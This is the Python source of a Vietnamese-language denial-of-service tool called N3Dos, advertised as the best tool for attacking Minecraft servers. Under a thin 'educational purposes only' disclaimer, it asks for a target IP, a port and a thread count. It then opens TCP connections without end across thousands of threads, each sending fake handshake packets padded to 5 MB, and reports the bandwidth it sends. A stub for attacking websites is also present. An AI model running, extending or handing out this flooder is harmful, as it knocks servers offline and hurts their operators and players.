# [==========================================================================================]
#
#       [1] - Tác giả: N3Co4
#       [2] - Github: https://github.com/N3Co4/N3Dos
#       [3] - Discord: @N3Co4
#       [4] - Mua VPS giá rẻ tại: https://vps247.cloud/
#       [5] - Liên hệ: maillite8@gmail.com
#
#       Lưu ý: Chương trình này chỉ được sử dụng cho mục đích giáo dục và nghiên cứu.
#              Miễn trừ trách nhiệm cho bất kỳ thiệt hại .
#              Nghiêm cấm buôn bán, tự xưng của mình, sao chép, phát tán mã nguồn.
#
#
# [==========================================================================================]


# Nhập thư viện Python
import os
import socket
import threading
import time
import struct

#Cấu hình tấn công
PACKET_PER_CONN = 1000
STATS_INTERVAL = 1  
DATA_PER_PACKET = 5000000
total_sent = 0
lock = threading.Lock()

# Hàm khởi động chương trình
def startup():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    menu()

# Hàm in logo
def logo():
    print(
        """

        ███╗   ██╗██████╗ ██████╗  ██████╗ ███████╗
        ████╗  ██║╚════██╗██╔══██╗██╔═══██╗██╔════╝
        ██╔██╗ ██║ █████╔╝██║  ██║██║   ██║███████╗
        ██║╚██╗██║ ╚═══██╗██║  ██║██║   ██║╚════██║
        ██║ ╚████║██████╔╝██████╔╝╚██████╔╝███████║
        ╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                           
        Công cụ tấn công máy chủ Minecraft tốt nhất
        Tác giả: N3Co4     
        """)

# Hàm in menu chính
def menu():
    while True:
        print("[", "="*60, "]")
        print("         [1] - Tấn công máy chủ Minecraft")
        print("         [2] - Tấn công máy chủ website (Đang phát triển)")
        print("         [3] - Giới thiệu")
        print("         [4] - Thoát")
        print("[", "="*60, "]")
        choice = input("\nLựa chọn của bạn: ").strip()

        if choice == '1':
            attack_minecraft()
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("[", "="*70, "]")
            print("")
            print("                 Chức năng này chưa được hoàn thiện.")
            print("")
            print("[", "="*70, "]")
            print("")
            print("Nhấn phím bất kỳ để quay lại menu chính...")
            input()
            os.system('cls' if os.name == 'nt' else 'clear')
            startup()
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("[", "="*70, "]")
            print("") 
            print("         [1] - Tác giả: N3Co4")
            print("         [2] - Github: https://github.com/N3Co4/N3Dos")
            print("         [3] - Discord: @N3Co4")
            print("         [4] - Mua VPS giá rẻ tại: https://vps247.cloud/")
            print("         [5] - Liên hệ: maillite8@gmail.com")
            print("") 
            print("[", "="*70, "]")
            print("")
            print("Nhấn phím bất kỳ để quay lại menu chính...")
            input()
            os.system('cls' if os.name == 'nt' else 'clear')
            startup()

        elif choice == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Thoát chương trình.")
            exit()
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Lựa chọn không hợp lệ, vui lòng thử lại.\n")

# Tạo packet giả mạo
def build_fake_packet(ip, port):
    ip_bytes = ip.encode()
    packet = b'\x00' + b'\x04'
    packet += struct.pack('>B', len(ip_bytes)) + ip_bytes
    packet += struct.pack('>H', port)
    packet += b'\x01'
    handshake = struct.pack('>B', len(packet)) + packet
    request = b'\x01\x00'
    return handshake + request + b'\x00' * (DATA_PER_PACKET - len(handshake + request))

# Gửi packet giả mạo
def sender(ip, port):
    global total_sent
    packet = build_fake_packet(ip, port)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            for _ in range(PACKET_PER_CONN):
                s.sendall(packet)
                with lock:
                    total_sent += len(packet)
            s.close()
        except:
            continue

# In thông tin thống kê
def stats_printer():
    global total_sent
    prev = 0
    while True:
        time.sleep(STATS_INTERVAL)
        with lock:
            now = total_sent
        delta = now - prev
        prev = now
        mbps = (delta * 8) / (STATS_INTERVAL * 1024 * 1024)
        mb = delta / (1024 * 1024)
        print(f"[+] Đã gửi {mb:.2f} MB tới mục tiêu ({mbps:.2f} Mbps)")

# Hàm chính để tấn công máy chủ Minecraft
def attack_minecraft():
    os.system('cls' if os.name == 'nt' else 'clear')
    ip = input("Nhập IP máy chủ (VD 127.0.0.1): ").strip()
    port = int(input("Nhập cổng (VD 25565): ").strip())
    thread_count = int(input("Số thread gửi (VD 10000): "))

    threading.Thread(target=stats_printer, daemon=True).start()

    print(f"Đang tấn công đến {ip}:{port} \n")
    for _ in range(thread_count):
        t = threading.Thread(target=sender, args=(ip, port), daemon=True)
        t.start()

    while True:
        time.sleep(1)

# Chạy chương trình
if __name__ == '__main__':
    startup()
